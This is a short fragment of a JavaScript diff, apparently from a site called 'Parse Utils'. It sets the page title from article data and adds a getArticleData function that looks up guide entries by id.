+    document.title = `${data.title} | Parse Utils`;
+}
+
+export function getArticleData(id) {
+    return guidesData[id];
 }
